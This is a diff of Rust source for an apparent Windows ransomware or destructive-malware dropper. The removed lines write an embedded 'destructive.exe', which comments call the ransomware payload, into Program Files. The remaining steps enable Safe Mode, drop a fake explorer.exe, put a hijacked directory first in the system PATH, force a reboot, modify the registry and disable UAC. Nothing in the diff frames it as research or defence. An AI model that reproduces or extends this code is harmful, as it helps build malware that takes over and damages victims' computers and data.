@@ -143,47 +143,6 @@ fn is_admin() -> bool {
     }
 }
 
-fn extract_embedded_exe() -> io::Result<()> {
-    // Retrieve the Program Files directory dynamically
-    let program_files = env::var("ProgramFiles").unwrap_or_else(|_| "C:\\Program Files".to_string());
-
-    // Create a long-lived value for the target directory path
-    let target_dir_str = format!("{}/utkudrk2", program_files);
-    let target_dir = Path::new(&target_dir_str);
-    
-    // Ensure the target directory exists
-    if !target_dir.exists() {
-        match fs::create_dir_all(target_dir) {
-            Ok(_) => println!("Created directory: {}", target_dir.display()),
-            Err(e) => {
-                eprintln!("Failed to create directory {}: {}", target_dir.display(), e);
-                return Err(e);
-            }
-        }
-    }
-
-    // Write the embedded executable to a file
-    let exe_path = target_dir.join("destructive.exe");
-    
-    let mut exe_file = match File::create(&exe_path) {
-        Ok(file) => file,
-        Err(e) => {
-            eprintln!("Failed to create file {}: {}", exe_path.display(), e);
-            return Err(e);
-        }
-    };
-
-    match exe_file.write_all(include_bytes!("../resources/destructive.exe")) {
-        Ok(_) => println!("Executable saved to {}.", exe_path.display()),
-        Err(e) => {
-            eprintln!("Failed to write executable file {}: {}", exe_path.display(), e);
-            return Err(e);
-        }
-    }
-
-    Ok(())
-}
-
 fn extract_explorer_exe() -> io::Result<()> {
     // Retrieve the system drive (typically C:)
     let system_drive = env::var("SystemDrive").unwrap_or_else(|_| "C:".to_string());
@@ -365,34 +324,29 @@ fn main() {
     if let Err(e) = enable_safe_mode() {
         eprintln!("Error enabling safe mode: {}", e);
     }
-
-    // Step 5: Extract ransomware payload
-    if let Err(e) = extract_embedded_exe() {
-        eprintln!("Error extracting embedded ransomware executable: {}", e);
-    }
         
-    // Step 6: Extract safe boot payload
+    // Step 5: Extract safe boot payload
     if let Err(e) = extract_explorer_exe() {
         eprintln!("Error extracting embedded safe boot executable: {}", e);
     }
     
-    // Step 7: Use set system path first to redirect to fake explorer.exe
+    // Step 6: Use set system path first to redirect to fake explorer.exe
     if let Err(e) = set_system_path_first() {
         eprintln!("Error setting system path: {}", e);
         return;
     }
 
-    // Step 8: Reboot the system to Safe Mode
+    // Step 7: Reboot the system to Safe Mode
     if let Err(e) = reboot_system() {
         eprintln!("Error rebooting system: {}", e);
     }
 
-    // Step 9: Modify Registry
+    // Step 8: Modify Registry
     if let Err(e) = modify_registry() {
         eprintln!("Error modifying registry: {}", e);
     }
 
-    // Step 10: Disable UAC
+    // Step 9: Disable UAC
     if let Err(e) = disable_uac() {
         eprintln!("Error disabling UAC: {}", e);
     }
